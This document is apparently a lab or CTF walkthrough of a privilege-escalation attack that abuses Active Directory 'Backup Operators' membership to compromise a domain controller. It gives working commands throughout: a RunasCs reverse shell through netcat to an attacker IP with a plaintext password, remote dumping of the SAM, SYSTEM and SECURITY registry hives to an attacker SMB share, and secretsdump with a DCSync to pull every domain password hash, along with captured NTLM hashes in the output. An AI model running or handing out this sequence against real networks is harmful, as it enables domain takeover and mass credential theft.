If you manage to get credentials of a user in AD that is part of the AD group "Backup Operators" then you can get to DC01 without WinRM or RDP.
**Reference:** https://github.com/improsec/BackupOperatorToolkit
**Preface:** To perform this attack you need a Shell on a machine that can communicate to the DC you want to attack. Plus you need credentials of a AD account that is part of "Backup Operators".

1)Get a shell on whichever target that can reach the DC(victim)
2)Upload Nc and Runascs.exe(https://github.com/antonioCoco/RunasCs)
3)Prepare a Samba share on your machine(this tool only can save to samba share)
```
    Create a folder with non-root user (otherwise the tool would not have write rights)
    Spinup a samba share on that folder ex: impacket-smbserver SHARENAME -smb2support /PATH/TO/FOLDER 
```
4)Upload **BackupOperatorToolkit.exe** (https://github.com/improsec/BackupOperatorToolkit/releases/tag/release) on the server carrier
5)Get a shell logged in as the **BackupOperator** user(if not already)
```
./RunasCs.exe Melissa WinterIsHere2022! "C:\temp\nc.exe 10.10.14.5 443 -e powershell.exe" -t 0
```
6) On the freshly gained shell you can run the tool (pointing to the Share from step3)
```
    .\BackupOperatorToolkit.exe DUMP \\YOURIP\PATH\TO\SHARE\ \\DCIP
    EX: .\BackupOperatorToolkit.exe DUMP \\10.10.14.5\backup\ \\192.168.210.16
```
(Remember to close the Samba path with the last '\' otherwise it will not work")
7)If can take a while so let the tool do it'd job but eventually you will find all 3 haves saved into your samba share(SAM,SYSTEM,SECURITY).
8)Next you can use secretsdump to parse those files locally and grab the Machine$ Account
```
impacket-secretsdump -sam <SAMFILE> -system <SYSTEMFILE> -security <SECURITYFILE> LOCAL
```
9)Lastly use again Secrets dump to run a DCSYNC attack and dump all the password hashes from DC (se the $MACHINE.ACC) 
```
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:d47a6d90e1c5adf4200227514e393948
```
(Remember to use the SAMACCOUNTNAME of the DC)
```
impacket-secretsdump DOMAIN/MACHINENAME$@<DCIP> -hashes <FULL:HASH> -just-dc-ntlm
```

### Example Samba:
```
[*] Connecting Share(1:IPC$)
[*] Connecting Share(2:backup)
[*] AUTHENTICATE_MESSAGE (internal\ZPH-SVRCDC01$,ZPH-SVRCDC01)
[*] User ZPH-SVRCDC01\ZPH-SVRCDC01$ authenticated successfully
[*] ZPH-SVRCDC01$::internal:aaaaaaaaaaaaaaaa:17fce0ec81cc746b975e3cbb7a94bb7a:010100000000000080af2cf605ead90193653de6b9c5a22f00000000010010007400690063004c004a0059006e004600030010007400690063004c004a0059006e0046000200100053006700410048006e005500470065000400100053006700410048006e005500470065000700080080af2cf605ead9010600040002000000080030003000000000000000000000000040000090c6f3c7f399cf2513d47845bb250907422e31c917ff38eb80ab00ed4822525a0a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e0035000000000000000000
[*] AUTHENTICATE_MESSAGE (internal\ZPH-SVRCDC01$,ZPH-SVRCDC01)
[*] User ZPH-SVRCDC01\ZPH-SVRCDC01$ authenticated successfully
[*] ZPH-SVRCDC01$::internal:aaaaaaaaaaaaaaaa:0c0ffdabeb14be46d7ae0be76168b92f:010100000000000080af2cf605ead9016fc88da7c46eacf300000000010010007400690063004c004a0059006e004600030010007400690063004c004a0059006e0046000200100053006700410048006e005500470065000400100053006700410048006e005500470065000700080080af2cf605ead9010600040002000000080030003000000000000000000000000040000090c6f3c7f399cf2513d47845bb250907422e31c917ff38eb80ab00ed4822525a0a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e0035000000000000000000
[*] AUTHENTICATE_MESSAGE (internal\ZPH-SVRCDC01$,ZPH-SVRCDC01)
[*] User ZPH-SVRCDC01\ZPH-SVRCDC01$ authenticated successfully
[*] ZPH-SVRCDC01$::internal:aaaaaaaaaaaaaaaa:ac904a40e864e312ddc4bf42c2c219dd:01010000000000000046c5f605ead9019b1a55aad583741a00000000010010007400690063004c004a0059006e004600030010007400690063004c004a0059006e0046000200100053006700410048006e005500470065000400100053006700410048006e00550047006500070008000046c5f605ead901060004000200000008003000300
```

### Example from toolkit:
```
PS C:\temp> .\BackupOperatorToolkit.exe DUMP \\10.10.14.5\backup\ \\192.168.210.16
.\BackupOperatorToolkit.exe DUMP \\10.10.14.5\backup\ \\192.168.210.16
DUMP MODE
[+] Connecting to registry hive
[+] hive: SAM
[+] Dumping hive to \\10.10.14.5\backup\
[+] Connecting to registry hive
[+] hive: SYSTEM
[+] Dumping hive to \\10.10.14.5\backup\
[+] Connecting to registry hive
[+] hive: SECURITY
[+] Dumping hive to \\10.10.14.5\backup\
PS C:\temp> 
PS C:\temp> 
```
